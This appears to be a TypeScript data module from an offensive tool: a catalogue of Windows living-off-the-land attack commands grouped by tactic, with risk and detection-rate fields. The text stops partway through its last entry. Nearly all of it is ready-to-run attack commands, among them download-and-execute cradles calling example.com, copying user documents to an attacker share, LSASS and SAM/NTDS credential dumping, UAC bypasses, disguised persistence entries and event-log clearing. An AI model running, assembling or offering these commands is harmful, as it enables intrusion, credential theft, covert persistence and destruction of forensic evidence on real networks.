/* ------------------------------------------------------------------ */
/*  Living-off-the-Land (LotL) Command Library                        */
/* ------------------------------------------------------------------ */

export interface LotLCommand {
  id: string
  name: string
  category: string
  description: string
  binaryPath: string
  command: string
  obfuscated: boolean
  riskLevel: "low" | "medium" | "high"
  detectionRate: number
  references: string[]
}

export interface LotLCategory {
  id: string
  name: string
  description: string
  commands: LotLCommand[]
}

export const LOTL_COMMANDS: LotLCategory[] = [
  /* ---------------------------------------------------------------- */
  /*  File Operations                                                  */
  /* ---------------------------------------------------------------- */
  {
    id: "file_operations",
    name: "File Operations",
    description: "Commands for file download, transfer, and manipulation",
    commands: [
      {
        id: "certutil_download",
        name: "Certutil Download",
        category: "file_operations",
        description: "Download remote file using Windows Certutil",
        binaryPath: "C:\\Windows\\System32\\certutil.exe",
        command: "certutil -urlcache -split -f http://example.com/file.exe C:\\temp\\file.exe",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.65,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Certutil/"],
      },
      {
        id: "certutil_encode",
        name: "Certutil Encode",
        category: "file_operations",
        description: "Base64 encode/decode files to evade content inspection",
        binaryPath: "C:\\Windows\\System32\\certutil.exe",
        command: "certutil -encode input.txt output.b64 && certutil -decode output.b64 decoded.exe",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.45,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Certutil/"],
      },
      {
        id: "bitsadmin_download",
        name: "Bitsadmin Download",
        category: "file_operations",
        description: "Download file using Background Intelligent Transfer Service",
        binaryPath: "C:\\Windows\\System32\\bitsadmin.exe",
        command: "bitsadmin /transfer /download /priority normal http://example.com/file.exe C:\\temp\\file.exe",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.55,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/"],
      },
      {
        id: "bitsadmin_bypass",
        name: "Bitsadmin Proxy Bypass",
        category: "file_operations",
        description: "Bypass system proxy using custom Bitsadmin job",
        binaryPath: "C:\\Windows\\System32\\bitsadmin.exe",
        command: "bitsadmin /create job1 && bitsadmin /setcustomproxy job1 null && bitsadmin /addfile job1 http://example.com/file.exe C:\\temp\\file.exe && bitsadmin /resume job1",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.60,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/"],
      },
      {
        id: "regsvr32_download",
        name: "Regsvr32 SCT Download",
        category: "file_operations",
        description: "Execute remote script via Regsvr32 COM scriptlet (Squiblydoo)",
        binaryPath: "C:\\Windows\\System32\\regsvr32.exe",
        command: "regsvr32 /s /n /u /i:http://example.com/payload.sct scrobj.dll",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.70,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/"],
      },
      {
        id: "makecab_archive",
        name: "Makecab Archive",
        category: "file_operations",
        description: "Compress files into CAB archive for exfiltration staging",
        binaryPath: "C:\\Windows\\System32\\makecab.exe",
        command: "makecab /f C:\\temp\\filelist.ddf",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.20,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Makecab/"],
      },
      {
        id: "compact_compress",
        name: "Compact Compression",
        category: "file_operations",
        description: "Compress files using Windows compact utility for staging",
        binaryPath: "C:\\Windows\\System32\\compact.exe",
        command: "compact /c /exe:lzx C:\\temp\\exfil.dat C:\\Users\\%USERNAME%\\Documents\\*",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.15,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Compact/"],
      },
      {
        id: "xcopy_transfer",
        name: "XCopy to Share",
        category: "file_operations",
        description: "Copy files recursively to a network share",
        binaryPath: "C:\\Windows\\System32\\xcopy.exe",
        command: "xcopy /s /e /h C:\\Users\\%USERNAME%\\Documents \\\\attacker\\share\\",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.40,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Xcopy/"],
      },
    ],
  },

  /* ---------------------------------------------------------------- */
  /*  System Information                                               */
  /* ---------------------------------------------------------------- */
  {
    id: "system_info",
    name: "System Information",
    description: "Commands for gathering system information",
    commands: [
      {
        id: "wmic_computersystem",
        name: "WMIC Computer System",
        category: "system_info",
        description: "Get detailed computer system information including domain membership",
        binaryPath: "C:\\Windows\\System32\\wbem\\wmic.exe",
        command: "wmic computersystem get Name, Domain, Manufacturer, Model, NumberOfProcessors, TotalPhysicalMemory",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.35,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Wmic/"],
      },
      {
        id: "wmic_process",
        name: "WMIC Process List",
        category: "system_info",
        description: "Enumerate all running processes with full command lines",
        binaryPath: "C:\\Windows\\System32\\wbem\\wmic.exe",
        command: "wmic process get Name, ProcessId, ParentProcessId, CommandLine",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.30,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Wmic/"],
      },
      {
        id: "wmic_service",
        name: "WMIC Service List",
        category: "system_info",
        description: "Enumerate all Windows services and their start modes",
        binaryPath: "C:\\Windows\\System32\\wbem\\wmic.exe",
        command: "wmic service get Name, DisplayName, State, StartMode, PathName",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.30,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Wmic/"],
      },
      {
        id: "wmic_share",
        name: "WMIC Share Enumeration",
        category: "system_info",
        description: "Enumerate all network shares on the local system",
        binaryPath: "C:\\Windows\\System32\\wbem\\wmic.exe",
        command: "wmic share get Name, Path, Type",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.40,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Wmic/"],
      },
      {
        id: "systeminfo",
        name: "SystemInfo",
        category: "system_info",
        description: "Dump comprehensive OS, hotfix, and hardware information",
        binaryPath: "C:\\Windows\\System32\\systeminfo.exe",
        command: "systeminfo",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.25,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Systeminfo/"],
      },
      {
        id: "whoami_priv",
        name: "WhoAmI Privileges",
        category: "system_info",
        description: "List current user's privileges and group memberships",
        binaryPath: "C:\\Windows\\System32\\whoami.exe",
        command: "whoami /all",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.20,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Whoami/"],
      },
      {
        id: "tasklist_modules",
        name: "Tasklist Module Dump",
        category: "system_info",
        description: "List processes and their loaded DLL modules",
        binaryPath: "C:\\Windows\\System32\\tasklist.exe",
        command: "tasklist /m /fo csv",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.25,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Tasklist/"],
      },
      {
        id: "driverquery",
        name: "Driver Query",
        category: "system_info",
        description: "Enumerate installed kernel-mode drivers",
        binaryPath: "C:\\Windows\\System32\\driverquery.exe",
        command: "driverquery /v /fo csv",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.20,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Driverquery/"],
      },
      {
        id: "query_user",
        name: "Query User Sessions",
        category: "system_info",
        description: "Enumerate logged-on user sessions on a remote host",
        binaryPath: "C:\\Windows\\System32\\query.exe",
        command: "query user /server:<hostname>",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.30,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Quser/"],
      },
    ],
  },

  /* ---------------------------------------------------------------- */
  /*  Network Operations                                               */
  /* ---------------------------------------------------------------- */
  {
    id: "network_operations",
    name: "Network Operations",
    description: "Commands for network reconnaissance and communication",
    commands: [
      {
        id: "powershell_dns",
        name: "PowerShell DNS Query",
        category: "network_operations",
        description: "Query DNS records using PowerShell Resolve-DnsName",
        binaryPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command: "Resolve-DnsName -Name example.com -Type ANY",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.30,
        references: ["https://lolbas-project.github.io/lolbas/Scripts/PowerShell/"],
      },
      {
        id: "netstat_connections",
        name: "Netstat Active Connections",
        category: "network_operations",
        description: "List all active TCP/UDP connections with owning PIDs",
        binaryPath: "C:\\Windows\\System32\\netstat.exe",
        command: "netstat -ano",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.45,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Netstat/"],
      },
      {
        id: "net_share",
        name: "Net Share Enumeration",
        category: "network_operations",
        description: "List all shared network resources",
        binaryPath: "C:\\Windows\\System32\\net.exe",
        command: "net share",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.40,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Net/"],
      },
      {
        id: "net_user",
        name: "Net User Enumeration",
        category: "network_operations",
        description: "Enumerate local user accounts",
        binaryPath: "C:\\Windows\\System32\\net.exe",
        command: "net user",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.50,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Net/"],
      },
      {
        id: "arp_cache",
        name: "ARP Cache Dump",
        category: "network_operations",
        description: "Display ARP cache to identify hosts on local subnet",
        binaryPath: "C:\\Windows\\System32\\arp.exe",
        command: "arp -a",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.15,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Arp/"],
      },
      {
        id: "route_print",
        name: "Route Table Print",
        category: "network_operations",
        description: "Print the IP routing table to identify network topology",
        binaryPath: "C:\\Windows\\System32\\route.exe",
        command: "route print",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.15,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Route/"],
      },
      {
        id: "ipconfig_all",
        name: "IPConfig Full Dump",
        category: "network_operations",
        description: "Dump full network adapter configuration including DNS suffix",
        binaryPath: "C:\\Windows\\System32\\ipconfig.exe",
        command: "ipconfig /all",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.10,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Ipconfig/"],
      },
      {
        id: "nbtstat_remote",
        name: "NBTStat Remote Lookup",
        category: "network_operations",
        description: "Query NetBIOS name table of a remote host",
        binaryPath: "C:\\Windows\\System32\\nbtstat.exe",
        command: "nbtstat -A <target_ip>",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.35,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Nbtstat/"],
      },
    ],
  },

  /* ---------------------------------------------------------------- */
  /*  Discovery                                                         */
  /* ---------------------------------------------------------------- */
  {
    id: "discovery",
    name: "Discovery",
    description: "Active Directory and domain environment reconnaissance",
    commands: [
      {
        id: "nltest_trusts",
        name: "NLTest Domain Trusts",
        category: "discovery",
        description: "Enumerate domain trust relationships via NLTest",
        binaryPath: "C:\\Windows\\System32\\nltest.exe",
        command: "nltest /domain_trusts /all_trusts",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.55,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Nltest/"],
      },
      {
        id: "nltest_dclist",
        name: "NLTest DC List",
        category: "discovery",
        description: "Enumerate domain controllers for a given domain",
        binaryPath: "C:\\Windows\\System32\\nltest.exe",
        command: "nltest /dclist:<domain>",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.50,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Nltest/"],
      },
      {
        id: "net_group_da",
        name: "Net Domain Admins",
        category: "discovery",
        description: "Enumerate members of the Domain Admins group",
        binaryPath: "C:\\Windows\\System32\\net.exe",
        command: "net group \"Domain Admins\" /domain",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.60,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Net/"],
      },
      {
        id: "dsquery_users",
        name: "DSQuery Admin Users",
        category: "discovery",
        description: "Query AD for members of Domain Admins via DSQuery",
        binaryPath: "C:\\Windows\\System32\\dsquery.exe",
        command: "dsquery user -memberof \"CN=Domain Admins,CN=Users,DC=domain,DC=com\" -limit 0",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.55,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Dsquery/"],
      },
      {
        id: "dsquery_computers",
        name: "DSQuery Computer Objects",
        category: "discovery",
        description: "Enumerate all computer objects in Active Directory",
        binaryPath: "C:\\Windows\\System32\\dsquery.exe",
        command: "dsquery computer -limit 0",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.50,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Dsquery/"],
      },
      {
        id: "net_localgroup_admins",
        name: "Net Local Admins",
        category: "discovery",
        description: "Enumerate local Administrators group members",
        binaryPath: "C:\\Windows\\System32\\net.exe",
        command: "net localgroup Administrators",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.35,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Net/"],
      },
    ],
  },

  /* ---------------------------------------------------------------- */
  /*  Persistence                                                      */
  /* ---------------------------------------------------------------- */
  {
    id: "persistence",
    name: "Persistence",
    description: "Commands for maintaining access after initial compromise",
    commands: [
      {
        id: "schtasks_create",
        name: "Schtasks OnStart",
        category: "persistence",
        description: "Create a scheduled task that runs at system startup",
        binaryPath: "C:\\Windows\\System32\\schtasks.exe",
        command: "schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\temp\\update.exe\" /sc onstart /ru SYSTEM /f",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.75,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Schtasks/"],
      },
      {
        id: "schtasks_hidden",
        name: "Schtasks Hidden Task",
        category: "persistence",
        description: "Create a hidden scheduled task using XML import",
        binaryPath: "C:\\Windows\\System32\\schtasks.exe",
        command: "schtasks /create /xml C:\\temp\\task.xml /tn \"\\Microsoft\\Windows\\Update\"",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.80,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Schtasks/"],
      },
      {
        id: "wmi_persistence",
        name: "WMI Event Consumer",
        category: "persistence",
        description: "Create a WMI event subscription for fileless persistence",
        binaryPath: "C:\\Windows\\System32\\wbem\\wmic.exe",
        command: "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=\"ProcFilter\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.85,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Wmic/"],
      },
      {
        id: "registry_run",
        name: "Registry Run Key",
        category: "persistence",
        description: "Add payload to HKCU Run key for user-level persistence",
        binaryPath: "C:\\Windows\\System32\\reg.exe",
        command: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"OneDriveSync\" /t REG_SZ /d \"C:\\temp\\update.exe\" /f",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.80,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Reg/"],
      },
      {
        id: "registry_runonce",
        name: "Registry RunOnce Key",
        category: "persistence",
        description: "Add payload to RunOnce key for single-execution persistence",
        binaryPath: "C:\\Windows\\System32\\reg.exe",
        command: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v \"Setup\" /t REG_SZ /d \"C:\\temp\\update.exe\" /f",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.75,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Reg/"],
      },
      {
        id: "at_schedule",
        name: "AT Scheduler",
        category: "persistence",
        description: "Schedule a one-time or recurring task using legacy AT command",
        binaryPath: "C:\\Windows\\System32\\at.exe",
        command: "at 23:55 /every:M,T,W,Th,F,S,Su C:\\temp\\update.exe",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.70,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/At/"],
      },
    ],
  },

  /* ---------------------------------------------------------------- */
  /*  Lateral Movement                                                 */
  /* ---------------------------------------------------------------- */
  {
    id: "lateral_movement",
    name: "Lateral Movement",
    description: "Commands for pivoting through a network",
    commands: [
      {
        id: "psexec_remote",
        name: "PsExec Remote Exec",
        category: "lateral_movement",
        description: "Execute commands on a remote system using PsExec",
        binaryPath: "C:\\Windows\\SysInternals\\PsExec.exe",
        command: "psexec \\\\target -accepteula -s -c C:\\temp\\payload.exe",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.75,
        references: ["https://lolbas-project.github.io/lolbas/OtherMSBinaries/PsExec/"],
      },
      {
        id: "wmi_remote",
        name: "WMI Remote Command",
        category: "lateral_movement",
        description: "Execute a process remotely via WMI",
        binaryPath: "C:\\Windows\\System32\\wbem\\wmic.exe",
        command: "wmic /node:<target> /user:<domain>\\<user> /password:<pass> process call create \"C:\\temp\\payload.exe\"",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.70,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Wmic/"],
      },
      {
        id: "winrm_remote",
        name: "WinRM Remote Shell",
        category: "lateral_movement",
        description: "Spawn a remote shell via WinRM (Windows Remote Management)",
        binaryPath: "C:\\Windows\\System32\\winrs.exe",
        command: "winrs -r:<target> -u:<domain>\\<user> -p:<pass> cmd /c C:\\temp\\payload.exe",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.65,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Winrs/"],
      },
      {
        id: "sc_remote_service",
        name: "SC Remote Service Create",
        category: "lateral_movement",
        description: "Create and start a service on a remote host via SC",
        binaryPath: "C:\\Windows\\System32\\sc.exe",
        command: "sc \\\\<target> create svc binpath= \"C:\\temp\\payload.exe\" && sc \\\\<target> start svc",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.80,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Sc/"],
      },
      {
        id: "net_use_mount",
        name: "Net Use Share Mount",
        category: "lateral_movement",
        description: "Mount a remote share using stolen credentials",
        binaryPath: "C:\\Windows\\System32\\net.exe",
        command: "net use Z: \\\\<target>\\C$ /user:<domain>\\<user> <password>",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.65,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Net/"],
      },
    ],
  },

  /* ---------------------------------------------------------------- */
  /*  Credential Access                                                */
  /* ---------------------------------------------------------------- */
  {
    id: "credential_access",
    name: "Credential Access",
    description: "Techniques for harvesting credentials from Windows systems",
    commands: [
      {
        id: "reg_sam_hive",
        name: "REG Save SAM Hive",
        category: "credential_access",
        description: "Save SAM and SYSTEM registry hives for offline NTLM extraction",
        binaryPath: "C:\\Windows\\System32\\reg.exe",
        command: "reg save HKLM\\SAM C:\\temp\\sam.hiv && reg save HKLM\\SYSTEM C:\\temp\\sys.hiv",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.80,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Reg/"],
      },
      {
        id: "vaultcmd_list",
        name: "VaultCmd List Credentials",
        category: "credential_access",
        description: "List Windows Credential Manager vaults and stored credentials",
        binaryPath: "C:\\Windows\\System32\\vaultcmd.exe",
        command: "vaultcmd /list && vaultcmd /listcreds:\"Windows Credentials\"",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.55,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Vaultcmd/"],
      },
      {
        id: "cmdkey_list",
        name: "CmdKey Credential List",
        category: "credential_access",
        description: "List stored RDP and network credentials via CmdKey",
        binaryPath: "C:\\Windows\\System32\\cmdkey.exe",
        command: "cmdkey /list",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.50,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Cmdkey/"],
      },
      {
        id: "ntdsutil_ifm",
        name: "Ntdsutil IFM Snapshot",
        category: "credential_access",
        description: "Create an Install From Media snapshot of NTDS.dit (DC only)",
        binaryPath: "C:\\Windows\\System32\\ntdsutil.exe",
        command: "ntdsutil \"activate instance ntds\" \"ifm\" \"create full C:\\temp\\ntds\" quit quit",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.90,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Ntdsutil/"],
      },
      {
        id: "vssadmin_shadow",
        name: "VSSAdmin Shadow Copy",
        category: "credential_access",
        description: "Create a volume shadow copy to access locked NTDS.dit",
        binaryPath: "C:\\Windows\\System32\\vssadmin.exe",
        command: "vssadmin create shadow /for=C: && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.85,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Vssadmin/"],
      },
      {
        id: "procdump_lsass",
        name: "ProcDump LSASS",
        category: "credential_access",
        description: "Dump LSASS memory for offline credential extraction",
        binaryPath: "C:\\Windows\\SysInternals\\procdump.exe",
        command: "procdump -accepteula -ma lsass.exe C:\\temp\\lsass.dmp",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.85,
        references: ["https://lolbas-project.github.io/lolbas/OtherMSBinaries/Procdump/"],
      },
    ],
  },

  /* ---------------------------------------------------------------- */
  /*  Defense Evasion                                                  */
  /* ---------------------------------------------------------------- */
  {
    id: "defense_evasion",
    name: "Defense Evasion",
    description: "Techniques to bypass security controls and evade detection",
    commands: [
      {
        id: "mshta_vbs",
        name: "MSHTA VBScript Exec",
        category: "defense_evasion",
        description: "Execute a VBScript payload through MSHTA to bypass AppLocker",
        binaryPath: "C:\\Windows\\System32\\mshta.exe",
        command: "mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://example.com/shell.ps1')\"\",0,True\")(window.close)",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.75,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Mshta/"],
      },
      {
        id: "rundll32_js",
        name: "Rundll32 JavaScript",
        category: "defense_evasion",
        description: "Execute JavaScript via Rundll32 mshtml to evade script policies",
        binaryPath: "C:\\Windows\\System32\\rundll32.exe",
        command: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -nop -exec bypass -w hidden\",0,true);",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.75,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Rundll32/"],
      },
      {
        id: "installutil_bypass",
        name: "InstallUtil AppLocker Bypass",
        category: "defense_evasion",
        description: "Execute .NET payload via InstallUtil to bypass AppLocker",
        binaryPath: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
        command: "InstallUtil.exe /logfile= /logtoconsole=false /U C:\\temp\\payload.exe",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.70,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Installutil/"],
      },
      {
        id: "regsvcs_bypass",
        name: "RegSvcs .NET COM Bypass",
        category: "defense_evasion",
        description: "Load a .NET COM DLL via RegSvcs to bypass application whitelisting",
        binaryPath: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe",
        command: "regsvcs.exe C:\\temp\\payload.dll",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.65,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/"],
      },
      {
        id: "eventvwr_uac",
        name: "Eventvwr UAC Bypass",
        category: "defense_evasion",
        description: "Auto-elevate privilege via eventvwr.exe registry hijack",
        binaryPath: "C:\\Windows\\System32\\eventvwr.exe",
        command: "reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d \"C:\\temp\\payload.exe\" /f && eventvwr.exe",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.70,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Eventvwr/"],
      },
      {
        id: "fodhelper_uac",
        name: "Fodhelper UAC Bypass",
        category: "defense_evasion",
        description: "Auto-elevate privilege via fodhelper.exe ms-settings hijack",
        binaryPath: "C:\\Windows\\System32\\fodhelper.exe",
        command: "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"C:\\temp\\payload.exe\" /f && reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /f && fodhelper.exe",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.75,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Fodhelper/"],
      },
      {
        id: "wevtutil_clear",
        name: "WevtUtil Clear Logs",
        category: "defense_evasion",
        description: "Clear Windows event logs to remove forensic evidence",
        binaryPath: "C:\\Windows\\System32\\wevtutil.exe",
        command: "wevtutil cl System && wevtutil cl Security && wevtutil cl Application",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.85,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Wevtutil/"],
      },
      {
        id: "msiexec_remote",
        name: "MSIExec Remote Package",
        category: "defense_evasion",
        description: "Silently install a remote MSI package to execute code",
        binaryPath: "C:\\Windows\\System32\\msiexec.exe",
        command: "msiexec /quiet /qn /i http://example.com/payload.msi",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.70,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Msiexec/"],
      },
      {
        id: "odbcconf_regsvr",
        name: "ODBCConf DLL Load",
        category: "defense_evasion",
        description: "Load a DLL via ODBCConf REGSVR action to bypass restrictions",
        binaryPath: "C:\\Windows\\System32\\odbcconf.exe",
        command: "odbcconf.exe /A {REGSVR C:\\temp\\payload.dll}",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.60,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/"],
      },
      {
        id: "cmstp_bypass",
        name: "CMSTP UAC Bypass",
        category: "defense_evasion",
        description: "Bypass UAC via CMSTP auto-elevation with a malicious INF",
        binaryPath: "C:\\Windows\\System32\\cmstp.exe",
        command: "cmstp.exe /s /ns C:\\temp\\malicious.inf",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.65,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Cmstp/"],
      },
    ],
  },

  /* ---------------------------------------------------------------- */
  /*  Execution                                                        */
  /* ---------------------------------------------------------------- */
  {
    id: "execution",
    name: "Code Execution",
    description: "Techniques for executing arbitrary code via legitimate binaries",
    commands: [
      {
        id: "powershell_cradle",
        name: "PowerShell Download Cradle",
        category: "execution",
        description: "In-memory script execution via PowerShell download cradle",
        binaryPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command: "powershell -nop -w hidden -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://example.com/shell.ps1')\"",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.80,
        references: ["https://lolbas-project.github.io/lolbas/Scripts/PowerShell/"],
      },
      {
        id: "powershell_encoded",
        name: "PowerShell Encoded Command",
        category: "execution",
        description: "Execute base64-encoded PowerShell to evade command-line logging",
        binaryPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command: "powershell -enc <BASE64_ENCODED_COMMAND>",
        obfuscated: true,
        riskLevel: "high",
        detectionRate: 0.65,
        references: ["https://lolbas-project.github.io/lolbas/Scripts/PowerShell/"],
      },
      {
        id: "forfiles_exec",
        name: "Forfiles Indirect Exec",
        category: "execution",
        description: "Execute a payload indirectly via Forfiles to confuse process trees",
        binaryPath: "C:\\Windows\\System32\\forfiles.exe",
        command: "forfiles /p C:\\Windows\\System32 /m cmd.exe /c \"C:\\temp\\payload.exe\"",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.55,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Forfiles/"],
      },
      {
        id: "pcalua_exec",
        name: "PCAlua Program Compat",
        category: "execution",
        description: "Execute a binary via Program Compatibility Assistant to evade monitoring",
        binaryPath: "C:\\Windows\\System32\\pcalua.exe",
        command: "pcalua.exe -a C:\\temp\\payload.exe -c <args>",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.45,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Pcalua/"],
      },
      {
        id: "wsl_exec",
        name: "WSL Linux Execution",
        category: "execution",
        description: "Escape Windows process monitoring by executing via WSL",
        binaryPath: "C:\\Windows\\System32\\wsl.exe",
        command: "wsl.exe -e bash -c \"curl -s http://example.com/shell.sh | bash\"",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.60,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Wsl/"],
      },
      {
        id: "xwizard_manifest",
        name: "XWizard Remote Manifest",
        category: "execution",
        description: "Load a remote XML manifest via XWizard to execute code",
        binaryPath: "C:\\Windows\\System32\\xwizard.exe",
        command: "xwizard.exe RunWizard {7940ACF8-60BA-4213-A7C3-F3B400EE266D} /u http://example.com/manifest.xml",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.50,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Xwizard/"],
      },
      {
        id: "mavinject_dll",
        name: "Mavinject DLL Injection",
        category: "execution",
        description: "Inject a DLL into a running process via Mavinject",
        binaryPath: "C:\\Windows\\System32\\mavinject.exe",
        command: "mavinject.exe <PID> /INJECTRUNNING C:\\temp\\payload.dll",
